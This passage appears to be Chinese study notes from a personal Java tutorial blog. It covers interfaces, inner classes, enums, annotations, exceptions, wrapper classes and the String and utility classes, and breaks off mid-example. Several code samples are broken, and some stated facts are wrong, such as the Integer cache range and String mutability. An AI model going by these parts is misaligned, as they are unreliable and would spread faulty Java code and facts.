当有多个子类共有的方法且逻辑相同时，考虑使用模板方法定义在父类中；对于重要或复杂的方法，可以考虑作为模板方法定义在父类中 # 优缺点 ** 封装不变部分：** 算法的不变部分被封装在父类中 ** 扩展可变部分：** 子类可以扩展或修改算法的可变部分 ** 提取公共代码：** 减少代码重复，便于维护 缺点就是 ** 类数目增加：** 没个不同的实现都需要一个子类，可能倒是系统庞大 # 实例 12345678910111213141516//创建一个抽象类，它的模板方法被设置为finalpublic abstract class Game &#123; abstract void initialize(); abstract void startPlay(); abstract void endPlay(); //模板 public final void play()&#123; //初始化游戏 initialize(); //开始游戏 startPlay //结束游戏 endPlay(); &#125;&#125; 1234567891011121314151617181920212223242526272829303132//创建扩展了上述类的实体类public class Cricket extends Game &#123; @Override void endPlay() &#123; System.out.println(&quot;Cricket Game Finished!&quot;); &#125; @Override void initialize() &#123; System.out.println(&quot;Cricket Game Initialized! Start playing.&quot;); &#125; @Override void startPlay() &#123; System.out.println(&quot;Cricket Game Started. Enjoy the game!&quot;); &#125;&#125;public class Football extends Game &#123; @Override void endPlay() &#123; System.out.println(&quot;Football Game Finished!&quot;); &#125; @Override void initialize() &#123; System.out.println(&quot;Football Game Initialized! Start playing.&quot;); @Override void startPlay() &#123; System.out.println(&quot;Football Game Started. Enjoy the game!&quot;); &#125;&#125; # 接口 接口就是给出一些没有实现的方法，到某个类要使用的时候，再根据具体情况把这些方法写出来 123456789interface 接口名&#123; //属性 //方法（抽象方法/默认方法/静态方法）&#125;class 类名 implements 接口&#123; 自己属性； 自己方法\t必须实现的接口的抽象方法&#125; 在 jdk7.0 前，接口里的所有方法都没有方法体 jdk8.0 后接口类可以有静态方法和默认方法 (static 和 default)，也就是说接口中可以有方法的具体实现 12345/* 文件名 : Animal.java */interface Animal &#123; public void eat(); public void travel();&#125; 123456789101112131415161718192021/* 文件名 : MammalInt.java */public class MammalInt implements Animal&#123; public void eat()&#123; System.out.println(&quot;Mammal eats&quot;); &#125; public void travel()&#123; System.out.println(&quot;Mammal travels&quot;); &#125; public int noOfLegs()&#123; return 0; &#125; public static void main(String args[])&#123; MammalInt m = new MammalInt(); m.eat(); m.travel(); &#125;&#125; # 细节 接口不能被实例化 接口中所有的方法都是 public 方法，如果不写也是默认 public，接口中抽象方法可以不用 abstract 修饰 一个普通类实现接口，就必须将该接口的所有方法都实现（alt+enter 快捷键） 抽象类实现接口，可以不用实现接口的方法 一个类可以同时实现多个接口 接口中的属性只能是 final 类型，而且是 public static final 修饰符，但是被隐藏了，比如 int a=1; 实际上是 public static final int a=1;（必须初始化） 接口中书信固定访问形式：接口名。属性名 一个接口不能继承其他的类，但是可以继承多个别的接口：interface A extends B,C {} 接口的修饰符只能是 public 和默认，这点和类的修饰符是一样的 # 接口和继承的比较 当子类继承了父类，就自动拥有了父类的功能。如果子类需要扩展功能，可以通过实现接口的方式来扩展。 可以理解为，实现接口是对 java 单继承机制的一种补充。 继承的作用主要在于：解决代码的复用性和可维护性 而接口的作用在于：设计。设计好各种规范，让类来实现这些方法 接口比继承更加灵活，继承是满足 is - a 的关系，而接口秩序满足 like - a 的关系 接口在一定程度上实现代码解耦 # 接口的多态 多态参数 123//实现了这个接口的类的对象，都可以作为形参传递public void work(UsbInterface a) &#123;//这里a就是接口类型的类的对象实例&#125; 多态数组 12345678910public class AAA&#123; public static void main(String[] args)&#123; Usb[] usb = new Usb[2]; usb[0] = new Phone(); usb[1] = new Camera(); &#125;&#125;interface Usb&#123;&#125;class Phone implements Usb&#123;&#125;class camera implements Usb&#123;&#125; 接口存在多态传递现象 123456789public class AA&#123; public static void main(String[] args)&#123; IG ig = new Teacher(); TH ih = new Teacher(); &#125;&#125;interface IH &#123;&#125;interface IG extends IH&#123;&#125;class Teacher implements IG &#123;&#125; # 内部类 一个类的内部又完整的嵌套类另一个类结构。被嵌套的类称为内部类 (inner class)，嵌套其他类的类称为外部类 (outer class)，是类的第五大成员 (属性、方法、构造器、代码块、内部类)，内部类最大的特点就是可以直接访问私有属性，并且可以体现类与类之间的包含关系。 12345class Outer&#123;//外部类\tclass Inner&#123;//内部类 &#125;&#125;class Other&#123;&#125;//其他类 # 内部类的分类 定义在外部类局部位置上（比如方法内）： 局部内部类（有类名） 匿名内部类（没有类名，重点） 定义在外部类的成员位置上： 成员内部类（没用 static 修饰） 静态内部类（使用 static 修饰） # 局部内部类的使用 局部内部类是定义在外部类的局部位置，比如方法中，并且有类名 局部内部类可以直接访问外部类的所有成员，包括私有成员 不能添加访问修饰符，因为他的低位就是应该局部变量，局部变量是不能使用修饰符的，但是可以使用 final 修饰，因为局部变量也可以使用 final 作用域：只在定义它的方法或代码中 局部内部类访问外部类的成员，可以直接访问 外部类访问局部类的成员，需要创建对象再访问 外部其他类不能访问局部内部类，因为局部内部类地位是一个局部变量 如果外部类和局部内部类的成员重名时，默认遵循就近原则，如果想访问外部类的成员，则可以使用（外部类名.this. 成员）去访问 System.out.println(\"外部类的n=\" + 外部类名.this.n);&lt;!--code￼59--> 匿名内部类是系统自动生成的，表面上以一个对象的形式存在，但实际上底层生成了一个类，比如外部类叫做 Outer，那么匿名内部类会叫做 Outer$1，如果后面还有匿名内部类就依次按顺序排号 12345678910111213class Outer &#123; new Person()&#123; @Override public void hi() &#123; System.out.println(&quot;hi&quot;); &#125;\t&#125;;&#125;class Person &#123; public void hi()&#123; System.out.println(&quot;hi~~~&quot;); &#125;&#125; 实际上他的形式在底层是这样的 1class Outer$1 extends Person &#123;&#125; # 细节 匿名内部类的语法比较奇特，因为匿名内部类既是一个类的定义，同时本身也是一个对象，因此从语法上看，它既有定义类的特征也有创建对象的特征。所以可以直接调用匿名内部类方法 如何调用呢，以上面的为例 12345678910111213class Outer &#123; new Person()&#123; @Override public void hi() &#123; System.out.println(&quot;hi&quot;); &#125;\t&#125;.ok();//可以直接在后面跟着调用，输出hi&#125;class Person &#123; public void hi()&#123; System.out.println(&quot;hi~~~&quot;); &#125;&#125; 1234567891011121314class Outer &#123; Person p = new Person()&#123; @Override public void hi() &#123; System.out.println(&quot;hi&quot;); &#125;\t&#125;; p.hi();//动态绑定，运行类型是Outer$1，所以输出的是hi而不是hi~~~&#125;class Person &#123; public void hi()&#123; System.out.println(&quot;hi~~~&quot;); &#125;&#125; 可以直接访问外部类的所有成员，包含私有的 不能添加访问修饰符，因为它的地位是一个局部变量 作用域：仅仅在定义它的方法或代码块中 匿名内部类访问外部类成员，直接访问 外部其他类不能访问匿名内部类，因为匿名内部类相当于一个局部变量 如果外部类和内部类的成员重名，在内部类访问时，遵循就近原则，如果想访问外部类的成员，可以使用（外部类名.this. 成员）去访问 # 实例 当作实参直接传递 123456789101112131415161718192021public class Grass &#123; public static void main(String[] args) &#123; //当作实参直接传递 f1(new IL() &#123; @Override public void show() &#123; System.out.println(&quot;hi&quot;); &#125; &#125;); &#125; //静态方法，形参是接口类型 public static void f1(IL il) &#123; il.show(); &#125;&#125;//接口interface IL&#123; void show();&#125; 对比一下传统的方法（硬编码），如果说要多次使用，可以就用传统方法，但如果只用一次，直接传递会更简洁高效 12345678910111213141516171819202122public class Grass &#123; public static void main(String[] args) &#123; //在这调用 f1(new Picture()); &#125; //静态方法，形参是接口类型 public static void f1(IL il) &#123; il.show(); &#125;&#125;//接口interface IL&#123; void show();&#125;class Picture implements IL&#123; @Override public void show() &#123; System.out.println(&quot;picture&quot;); &#125;&#125; 有一个铃声接口 Bell，里面有一个 ring 方法；有一个手机类 Cellphone，具有闹钟功能 alarmclock，参数是 Bell 类型；测试手机类的闹钟功能，通过匿名内部类作为参数，输出 &quot;起床啦&quot;；再传入一个匿名内部类对象，输出 &quot;get up!&quot; 123456789101112131415161718192021222324252627282930public class Grass &#123; public static void main(String[] args) &#123; Cellphone cellphone = new Cellphone(); cellphone.alarmclock(new Bell() &#123; @Override public void ring() &#123; System.out.println(&quot;起床啦&quot;); &#125; &#125;); cellphone.alarmclock(new Bell() &#123; @Override public void ring() &#123; System.out.println(&quot;get up!&quot;); &#125; &#125;); &#125; &#125;class Cellphone&#123; public void alarmclock(Bell bell) &#123; bell.ring(); &#125;&#125;interface Bell&#123; void ring();&#125; # 成员内部类的使用 成员内部类是定义在外部类的成员位置，并没有 static 修饰 可以直接访问外部类的所有成员，包括私有的 可以添加任意访问修饰符（public、protected、默认、private），因为它本身也是一个成员 作用域和外部类的其他成员一样为整个类体，在外部类的成员方法中创建成员内部类对象，再调用方法 成员内部类访问外部类，直接访问 外部类访问成员内部类，创建对象再访问 外部其他类访问成员内部类 // 第一种方式，相当于把 new Inner () 当作是 Outer 的成员Outer.Inner inner = Outer.new Inner();&lt;!--code￼67--> // 第三种其实本质上就是前两种的结合new Outer().new Inner();&lt;!--code￼68--> 可以直接访问外部类的所有静态成员，包含私有的，但不能直接访问非静态成员 可以添加任意访问修饰符（public、protected、默认、private），因为它的地位就是一个成员 作用域：同其他的成员，为整个类体 静态内部类访问外部类，可以直接访问所有静态成员 外部类访问静态内部类，创建对象再访问 外部其他类访问静态内部类 1Outer.Inner inner = new Outer.Inner(); 如果外部类和内部类的成员重名，在内部类访问时，遵循就近原则，如果想访问外部类的成员，可以使用（外部类名。成员）去访问 # 枚举类 枚举是一组常量的集合，属于一种特殊的类，里面只包含一组有限的特定的对象 不需要提供 setXxx 方法，因为枚举对象值通常为只读 对枚举对象 / 属性使用 final+static 共同修饰，实现底层优化 枚举对象名通常使用全部大写，常量的命名规范 枚举对象根据需要，也可以有多个属性 # 实例 用自定义类来实现枚举 123456789101112131415161718192021222324252627282930313233343536373839public class Grass &#123; public static void main(String[] args) &#123; System.out.println(Season.SPRING); System.out.println(Season.SUMMER); System.out.println(Season.AUTUMN); System.out.println(Season.WINTER); &#125;&#125;class Season &#123; private String name; private String desc; public static final Season SPRING = new Season(&quot;春天&quot;, &quot;温暖&quot;); public static final Season SUMMER = new Season(&quot;夏天&quot;, &quot;炎热&quot;); public static final Season AUTUMN = new Season(&quot;秋天&quot;, &quot;凉爽&quot;); public static final Season WINTER = new Season(&quot;冬天&quot;, &quot;寒冷&quot;); private Season(String name, String desc) &#123; this.name = name; this.desc = desc; &#125; public String getName() &#123; return name; &#125; public String getDesc() &#123; return desc; &#125; @Override public String toString() &#123; return &quot;Season&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &quot;, desc=&#x27;&quot; + desc + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; 使用 enum 关键字实现枚举 123456789101112131415161718192021222324252627282930313233343536373839404142public class Grass2 &#123; public static void main(String[] args) &#123; System.out.println(Season.SPRING); System.out.println(Season.SUMMER); System.out.println(Season.AUTUMN); System.out.println(Season.WINTER); &#125;&#125;enum Season2 &#123; //使用关键字enum代替class //如果有多个常量(对象)，用逗号间隔 //格式：常量名(实参列表) //如果使用enum来实现枚举，要求将定义常量对象写在最前面 SPRING(&quot;春天&quot;, &quot;温暖&quot;),SUMMER(&quot;夏天&quot;, &quot;炎热&quot;), AUTUMN(&quot;秋天&quot;, &quot;凉爽&quot;),WINTER(&quot;冬天&quot;, &quot;寒冷&quot;),WHAT; private String name; private String desc; private Season2&#123;&#125;//无参构造器，上面的WHAT因为没有传入参数所以是调用的无参构造器 private Season2(String name, String desc) &#123; this.name = name; this.desc = desc; &#125; public String getName() &#123; return name; &#125; public String getDesc() &#123; return desc; &#125; @Override public String toString() &#123; return &quot;Season&#123;&quot; + &quot;name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &quot;, desc=&#x27;&quot; + desc + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; # 细节 当使用 enum 关键字开发一个枚举类时，默认会继承 Enum 类，且是一个 final 类（可以通过反编译看到） 传统的 public static final Season SPRING = new Season (“春天”, “温暖”); 简化成 SPRING (“春天”, “温暖”)，这里必须知道它调用的时哪个构造器 如果使用无参构造器创建枚举对象，则实参列表和小括号都可以省略 当有多个枚举对象时，使用逗号间隔，分号结尾 枚举对象必须放在枚举类的行首 # enum 常用方法 因为 enum 会默认继承 Enum 类，在父类中有些方法可以用 toString：Enum 类已经重写过了，返回的是当前对象的属性信息 name：返回当前对象名（常量名），子类中不能重写 ordinal：返回当前对象的位置号，默认从 0 开始 values：返回当前枚举类中所有的常量 valueOf：将字符串转换成枚举对象，要求字符串必须为已有的常量名，否则报异常 compareTo：比较两个枚举常量，比较的就是位置号。（位置编号相减得 0 为真） # enum 实现接口 使用 enum 关键字后，不能再继承其他类，因为 enum 类会隐式继承 Enum，而 java 是单继承机制 枚举类和普通类一样，可以实现接口 1enum 类名 implements 接口1, 接口2&#123;&#125; # 注解 注解（Annotation）也被称为元数据（Metadata），用于修饰包、类、方法、属性、构造器、局部变量等数据信息 和注释一样，注解不影响程序逻辑，但注解可以被编译或运行，相当于嵌入在代码中的补充信息 再 javase 中，注解的使用目的比较简单，例如标记过时的功能，忽略警告等。在 javaEE 中注解占据了更重要的角色，例如用来配置应用程序的任何切面，代替 java EE 旧版中所遗留的繁冗代码和 XML 配置等。 使用 Annotation 时要在其前面加 @符号，并把该 Annotation 当成一个修饰符使用，用于修饰它支持的程序元素 三个基本的 Annotation： @Override：限定某个方法，是重写父类方法，该注解只能用于方法 @Deprecated：用于表示某个程序元素（类、方法等）已过时 @SuppressWarnings：抑制编译器的警告 # @Override @Override 只能修饰方法，不能修饰其他类、包、属性等 @Target 是修饰注解的注解，称为元注解 查看 @Override 注解的源码为 @Target (ElementType.METHOD)，说明只能修饰方法 12345678910111213141516class Father&#123;\tpublic void fly() &#123; System.out.println(&quot;Father fly&quot;);\t&#125;&#125;//这个@Override其实是可写可不写，但是写了会让系统再编译的时候去检查这里是否真的重写了，重写了才能编译成功，没重写就会报错class Son extends Father &#123; @Override public void fly() &#123; System.out.println(&quot;Son fly&quot;); &#125;&#125;public @interface Override &#123; //这是一个注解类，不是接口&#125; # @Deprecated 用于表示某个程序元素（类、方法、属性等）已过时 可以修饰方法、类、字段、包、参数等 @Deprecated 的作用可以做到新旧版本的兼容和过渡 @Target(value={CONSTRUCTOR, FIELD, LOCAL_VARIABLE, METHOD, PACKAGE, PARAMETER, TYPE}) 12345678910111213141516public class Grass2 &#123; public static void main(String[] args) &#123; A a = new A(); a.hi(); System.out.println(a.n); &#125;&#125;@Deprecatedclass A &#123; @Deprecated public int n = 1; @Deprecated public void hi() &#123; System.out.println(&quot;hi&quot;); &#125;&#125; # @SuppressWarnings 有时候写代码，代码其实可以正常运行，但是会有一些警告，这个时候就可以用 @SuppressWarnings 注解来抑制警告信息 12@SuppressWarnings(&#123;&quot;all&quot;, &quot;rawtypes&quot;&#125;)//除了all还有专门抑制其他某种类型警告，具体的使用可以查阅资料 @SuppressWarnings 的作用范围和放置的位置相关，比如放在 main 方法，那么抑制的范围就是 main 方法 # 异常 Exception 快捷键：ctrl + alt + t 选择 try-catch # 异常的概念 一般可以分为两类 Error：java 虚拟机无法解决的严重问题，如：JVM 系统内部错误、资源耗尽等严重情况。比如 StackOverflow [栈溢出] 和 OOM (out of memory)，Error 是严重错误，程序会崩溃 Exception：其它因编程错误或偶然的外在因素导致的一般性问题，可以使用针对性的代码进行处理。例如空指针方向，试图读取不存在的文件，网络连接中断等等，Exception 分为两大类：运行时异常和编译时异常 # 异常体系图 异常分为两大类，运行时异常和编译时异常 运行时异常编译器检查不出来，一般是指编程时的逻辑错误，时程序员应该避免其出现的异常。java.lang.RuntimeException 类以及它的子类都是运行时异常 对于运行时异常，可以不做处理，因为这类异常很普遍，若全处理看你会对程序的可读性和运行效率产生影响 编译时异常时编译器要求必须处理的异常 常见的运行时异常： NullPointException 空指针异常：当应用程序试图在需要对象的地方使用 null 时，抛出该异常 ArithmeticException 数学运算异常 ArrayIndexOutOfBoundsException 数组下标越界异常 ClassCastException 类型转换异常 NumberFormatException 数字格式不正确异常 常见的编译异常： SQLException：操作数据库时，查询表可能发生异常 IOException：操作文件时发生的异常 FileNotFoundException：当操作一个不存在的文件时发生异常 ClassNotFoundException：加载类，而该类不存在时异常 EOFException：操作文件，到文件末尾，发生异常 IllegalArgumentException：参数异常 # 异常处理概念 异常处理就是当异常发生时，对异常处理的方式 # try-catch-finally 程序员在代码中捕获发生的异常，自行处理 try 块用于包含可能出错的代码，catch 块用于处理 try 块中发生的异常，可以根据需要在程序中有多个 try-catch 模块 注意事项： 如果异常发生了，则异常发生后面的代码都不会执行，直接进入到 catch 块 如果异常没有发生，则顺序执行 try 的代码块，不会进入 catch 如果希望不管是否发生异常，都执行某段代码（比如关闭连接，释放资源等），则使用 finally {} 如果 try 代码块可能有多个异常，，可以使用多个 catch 分别捕获不同的异常，但是要求子类异常写在前面，父类一场写在后面（比如 Exception 在后，NullPointerException 在前），如果发生异常，只会匹配一个 catch 可以进场 try-finally 配合使用，这种用法相当于没有捕获异常，因此程序会直接崩掉。当希望执行一段代码，不管是否发生异常，都必须执行某个业务逻辑时可以使用 12345678910try &#123; //可疑代码 //将异常生成对应的异常对象，传送给catch块&#125;catch(异常) &#123; //对异常的处理&#125;catch(异常) &#123; //对异常的处理&#125;finally &#123; //释放资源等&#125; # throws 将发生的异常抛出，交给调用者（方法）来处理，最顶级的处理者就是 JVM 如果一个方法（中的语句执行时）可能生成某种异常，但不能确定如何处理这种异常，则此方法显式地声明抛出异常，表明该方法将不对这些异常进行处理，而又该方法的调用者处理 在方法声明中用 throws 语句可以声明抛出异常的列表，throws 后面的异常类型可以是方法中产生的异常类型，也可以是它的父类 注意事项： 对于编译异常，程序中必须处理，比如 try-catch 或者 throws 对于运行时异常，程序中如果没有处理，默认就是 throws 的方式处理 子类重写父类的方法时，对抛出异常的规定：子类重写的方法所抛出的异常类型要么和父类抛出的一致，要么为父类抛出的异常的类型的子类型 在 throws 过程中，如果有方法 try-catch，就相当于处理异常，就可以不必 throws 1234public void f1() throws Exception &#123;//这里是Exception是父类，也可以是FileNotFoundException子类 //也可以多个子类异常，逗号分隔 FileInputStream fis = new FileInputStream(&quot;d://1.txt&quot;);&#125; # 自定义异常 当程序中出现了某些错误，但该错误信息并没有在 Throwable 子类中描述处理，这个时候可以自己设计异常类，用于描述该错误信息 自定义异常的步骤 定义类：自定义异常类名（程序员自己写），继承 Exception 或 RuntimeException 如果继承 Exception，属于编译异常 如果继承 RuntimeException，属于运行异常（一般来说继承 RuntimeException） 123456789101112131415public class Grass &#123; public static void main(String[] args) &#123; int age = 151; if(!(age &gt;= 18 &amp;&amp; age &lt;= 120))&#123; throw new AgeException(&quot;age should between 18 and 120.&quot;); &#125; &#125;&#125;//一般情况我们自定义异常时，最好是继承RuntimeException//这样比较方便，不需要在主方法中再去抛异常class AgeException extends RuntimeException &#123; public AgeException(String message) &#123;//构造器 super(message); &#125;&#125; # throw 和 throws 的对比 意义 位置 后面跟的东西 throws 异常处理的一种方式 方法声明处 异常类型 throw 手动生成异常对象的关键字 方法体中 异常对象 # 常用类 # 包装类 Wrapper # 包装类的分类 针对八种基本数据类型相应的应用类型 —— 包装类 有了类的特点，就可以调用类中的方法 基本数据类型 包装类 boolean Boolean char Character byte Byte short Short int Integer long Long float Float double Double # 包装类和基本数据类型的转换 包装类是对象，基本数据类型是属性 jdk5 前的手动装箱和拆箱方式，装箱：基本类型 -&gt; 包装类型，反过来就是拆箱 jdk5 及以后的自动装箱和拆箱方式 自动装箱底层调用的时 valueOf 方法，比如 Integer.valueOf () 1234567891011121314151617public class Grass &#123; public static void main(String[] args) &#123; //手动装箱int-&gt;Integer int n1 = 100; Integer integer = new Integer(n1); Integer integer1 = Integer.valueOf(n1); //手动拆箱Integer-&gt;int int i = integer.intValue(); //jdk5后，就可以自动装箱和自动拆箱 int n2 = 200; Integer interger2 = n2;//底层使用的依然还是Integer.valueOf(n2) //自动拆箱 int n3 = interger2;//底层使用的还是intValue()方法 &#125;&#125; # 包装类型和 String 类型的相互转换 12345678910111213141516171819public class Grass &#123; public static void main(String[] args) &#123; //包装类(Integer)-&gt;String Integer i = 100; //way 1 String str = i + &quot;&quot;;//这里只是以i为主体进行了一个转换，但i自己本身还是没变化 //way2 String str2 = i.toString(); //way3 String str3 = String.valueOf(i); //String-&gt;包装类(Integer) String str4 = &quot;12345&quot;; //way1 int i2 = Integer.parseInt(str4);//使用到了自动装箱 //way2 Integer i3 = new Integer(str4);//用到了构造器，可以ctrl+b查看 &#125;&#125; # Integer 类和 Character 类的常用方法 这几个是比较常用的，还有非常多 1234567891011System.out.println(Integer.MIN_VALUE);//返回最大/最小值 System.out.println(Integer.MAX_VALUE); System.out.println(Character.isDigit(&#x27;a&#x27;));//判断是不是数字System.out.println(Character.isLetter(&#x27;a&#x27;));//判断是不是字母 System.out.println(Character.isLowerCase(&#x27;a&#x27;));//判断大小写 System.out.println(Character.isUpperCase(&#x27;a&#x27;)); System.out.println(Character.isWhitespace(&#x27;a&#x27;));//判断是不是空格 System.out.println(Character.toUpperCase(&#x27;a&#x27;));//转换大小写 System.out.println(Character.toLowerCase(&#x27;A&#x27;)); # Integer 类 面试题： 1234567891011121314//由于生成的是两个对象，所以结果为false Integer i = new Integer(1); Integer j = new Integer(1); System.out.println(i == j); Integer m = 1;//底层为Integer.valueOf(1); Integer n = 1;//底层为Integer.valueOf(1); System.out.println(m == n);//在valueOf源码中，赋值在-127~128之间的， //就直接返回数值，而超过这个范围的，就new一个对象返回，所以这里为true Integer x = 128; Integer y = 128; System.out.println(x == y); //而这里大于了127不在范围中，返回一个对象，所以x和y是不同的两个对象，为false 123456Integer x = 128;int y = 128;System.out.println(x == y);//这个要注意，只要有int类型的(基本数据类型)，那么做比较的时候就是比较值是否相等//哪怕x的底层是new一个对象，但这里对比的还是值的大小//所以这里输出为true # String 类 字符串的字符使用 Unicode 字符编码，一个字符（不区分字母还是汉字）占两个字节 String 类较常用构造器 1234String s1 = new String();String s2 = new String(String original);String s3 = new String(char[] a);String s4 = new String(char[] a, int startIndex, int count); String 类实现了接口 Serializable（String 可以序列化，在网络传输），还实现了 Comparable（对象可以比较大小） String 是 final 类，不能被其他的类继承 String 有属性 private final char value []; 用于存放字符串内容，所以其本质是字符数组 value 是一个 final 类型，不可以修改（地址不可修改，值可以修改） # 创建 String 对象的两种方式 直接赋值： String s = &quot;tch&quot;; 创建过程：先从常量池查看是否有 &quot;tch&quot; 数据空间，如果有，则直接指向它；如果没有则重写创建，然后指向。s 最终指向的是常量池的空间地址 调用构造器： String s = new String(&quot;tch&quot;); 创建过程：先在堆中创建空间，里面维护了 value 属性，指向常量池的 &quot;tch&quot; 空间。如果常量池没有 &quot;tch&quot;，就重新创建，如果有，就直接通过 value 指向。最终指向的是堆中的空间地址 # 实例 12345678String a = &quot;tch&quot;;String b = new String(&quot;tch&quot;);System.out.println(a.equals(b));//TSystem.out.println(a == b);//FSystem.out.println(a == b.intern());//TSystem.out.println(b == b.intern());//F//intern()方法的作用：如果池中已经包含了一个等于这个String对象的字符串，就直接返回池中的字符串。否则，将此String对象添加到池中，并返回此String对象的引用 123456789101112Person p1 = new Person();p1.name = &quot;tch&quot;;Person p2 = new Person();p2.name = &quot;tch&quot;;System.out.println(p1.name.equals(p2.name));//TSystem.out.println(p1.name == p2.name);//TSystem.out.println(p1.name == &quot;tch&quot;);//T String s1 = new String(&quot;tch&quot;);String s2 = new String(&quot;tch&quot;);System.out.println(s1 == s2);//F # String 对象特性 String 是一个 final 类，代表不可变的字符序列 字符串是不可变的，一个字符串对象一旦被分配，其内容是不可改变的 常量相加，看的是常量池；变量相加，看的是堆 123456789//一共有三个对象String a = &quot;hello&quot;;String b = &quot;abc&quot;;String c = a + b;//1.先创建一个StringBuilder sb = StringBuilder()//2.执行sb.append(&quot;hello&quot;);//3.执行sb.append(&quot;abc&quot;);//4.String c = sb.toString();//最后c指向堆中的对象(String)value[]--&gt;池中的&quot;helloabc&quot; # String 类的常见方法 String 类是保存字符串常量的，每次更新都需要重新开辟空间，效率较低，因此 java 设计者还提供了 StringBuilder 和 StringBuffer 来增强 String 的功能。 1234substring(1,4);//左闭右开，截取从1到4减1的字符串indexOf();//获取字符在字符串对象中第一次出现的索引，从0开始，若找不到返回-1toUpperCase();\ttoLowerCase(); concat();\treplace(); split(); compareTo(); toCharArray(); format(); # StringBuffer 类 java.lang.StringBuffer 代表可变的字符序列，可以对字符串内容进行增删 很多方法与 StringBuffer 相同，但 StringBuffer 是可变长度的 StringBuffer 是一个容器 123456StringBuffer str1 = new StringBuffer(&quot;hello&quot;);//1.StringBuffer的直接父类是AbstractStringBuilder//2.StringBuffer实现了序列化//3.在父类中AbstractStringBuilder有属性char[] value，且不是final//4.该value数组存放字符串内容，因此他是存放在堆中的//5.StringBuffer是一个final类，不能被继承 # String 和 StringBuffer 的对比 String 保存的是字符串常量，里面的值不能更改，每次 String 类的更新，实际上是更改地址，效率比较低 StringBuffer 保存的是字符串变量，里面的值可以修改，每次 StringBuffer 的更新实际上可以更新内容，不用每次更改地址，效率较高（空间大小不够的时候会扩容，也就会更改地址） # StingBuffer 的构造器 123456789StringBuffer()\t//创建一个大小为16的char[]，用于存放字符内容StringBuffer(CharSequence seq)\t//构造一个字符串缓冲区，它包含与指定的CharSequence相同的字符StringBuffer(int capacity)\t//指定char[]的大小 StringBuffer(String str)\t//通过给一个String来创建StringBufferStringBuffer hello = new StringBuffer(&quot;hello&quot;); # String 和 StringBuffer 相互转换 # String —&gt; StringBuffer 123456String s = &quot;helllo&quot;;//way 1StringBuffer b1 = new StringBuffer(s);//way 2StringBuffer b2 = new StringBuffer();b2.appends(s); # StringBuffer —&gt; String 1234//way 1String s2 = b1.toString(); //b1是[StringBuffer]//way 2String s3 = new String(b1); # StringBuffer 类常见方法 123456789101112131415StringBuffer s = new StringBuffer(&quot;hello&quot;);//增s.append(&#x27;,&#x27;);s.append(&quot;hi&quot;);s.append(&quot;123&quot;).append(100).append(true).append(1.5);//删：左闭右开delete(start, end)//改：将始终位置的内容替换为string，左闭右开replace(start, end, string)\t//查：查找子串在字符串第一次出现的索引，找不到返回-1indexOf()//插：在指定位置插入字符串insert(pos, string)//获取长度：length # StringBuilder 类 一个可变的字符序列。此类提供一个与 StringBuffer 兼容的 API，但不保证同步。该类被设计用作 StringBuffer 的一个简易替换，用在字符串缓冲区被单个线程使用的时候。如果可能，建议优先采用该类，因为在大多数实现中，它比 StringBuffer 要快 在 StringBuilder 上的主要操作是 append 和 insert 方法，可重载这些方法，以接受任意类型的数据 StringBuilder 的常用方法和 StringBuffer 是一样的 StringBuilder 是 final 类，不能被继承 StringBuilder 对象字符序列也是存放在父类 AbstractStringBuilder 的 char [] value 中，所以也是存放在堆中 多线程使用有风险，源码中没有线程同步的操作，也就是没有 synchronized 关键字 # String，StringBuffer 和 String Builder 的对比 String、StringBuffer 和 StringBuilder 都代表可变的字符序列，且方法一样 String：不可变字符序列，效率低，但是复用率高 StringBuffer：可变字符序列，效率较高（增删），线程安全 StringBuilder：可变字符序列，效率最高，但线程不安全 String 使用注意说明 12string s = &quot;a&quot;;s += &quot;b&quot;; 这串代码中，原本的字符串对象 &quot;a&quot; 是被丢弃了之后在产生的 &quot;ab&quot;，多次执行这种改变内容的操作会导致大量副本对象存留在内存中，降低效率，尤其是当这种操作在循环中时。所以在需要对 String 对象做大量的修改时，不要用 String # Math 类 abs 绝对值 1int abs = Math.abs(-1);//1 pow 求幂 1double pow = Math.pow(2, 4);//2的四次方 ceil 向上取整 1double ceil = Math.ceil(-3.001);//-3.0 floor 向下取整 1double floor = Math.floor(-4.99);//-5.0 round 四舍五入 1long round = Math.round(-5.001);//-5 sqrt 开方 1double sqrt = Math.sqrt(9.0)//3.0 random 求随机数 123double random = Math.random();//返回一个[0,1)之间的随机小鼠//如果要让它取到一个设定范围内的整数，比如[2, 7]，可以这么写int random = (int)(2 + Math.random() * (7 - 2 + 1));//因为需要取整，所以右边需要加1 max、min 求最值 12int min = Math.min(1, 10);int max = Math.max(1, 10); # Arrays 类 Arrays 类用于管理或操作数组（比如排序、搜索） toString：返回数组的字符串形式 1Arrays.toString(arr); sort 排序：自然排序和定制排序（忘记了可看 p483） 12345678910111213//自然排序Integer arr[] = &#123;1, -1, 4, 5, 0&#125;;Arrays.sort(arr);//定制排序，传入一个接口Comparator实现定制排序Arrays.sort(arr, new Comparator() &#123; @override public int compare(Object o1, Object o2) &#123; Integer i1 = (Integer o1); Integer i2 = (Integer o2); return i1 - i2; &#125;&#125;);//实现了Comparator接口的匿名内部类，要求实现compare方法 binarySearch：通过二分法进行查找，只能对有序数组使用 1int index = Arrays.binarySearch(arr, 3); copyOf 数组元素复制 1Integer[] newArr = Arrays.copyOf(arr, arr.length); fill：数组元素的填充 12Integer[] num = new Integer[] &#123;5, 3, 1&#125;;Arrays.fill(num, 99);//将数组用99填充 equals：比较两个数组的元素内容是否完全一致 1boolean equals = Arrays.equals(arr1, arr2); asList：将一组值转换成 list 1234List&lt;Integer&gt; asList = Arrays.asList(2,3,4,5,6,1);//asList会将这些数据转为一个List集合System.out.println(&quot;asList=&quot; + asList);//返回asList编译类型List(接口)//asList的运行类型是java.util.Arrays$ArrayList # System 类 exit：退出当前程序 arraycopy：复制数组元素，比较适合底层调用，一般情况还是用 Arrays.copyOf。 1234int[] src = &#123;1,2,3&#125;;int[] dest = new int[3];System.arraycopy(src, 0, dest, 0, 3);//把src从第0个位置开始的元素，复制给dest，从0位置开始，复制3个元素 currentTimeMillens：返回当前时间距离 1970-1-1 的毫秒数 gc：运行垃圾回收机制 1System.gc(); # BigInteger 和 BigDecimal 类 BigInteger 适合保存比较大的整型 BigDecimal 适合保存精度更高的浮点型？ 12345BigInteger a = new BigInteger(&quot;9999999999999999999999&quot;);BigInteger b = new BigInteger(&quot;100&quot;);BigDecimal x = new 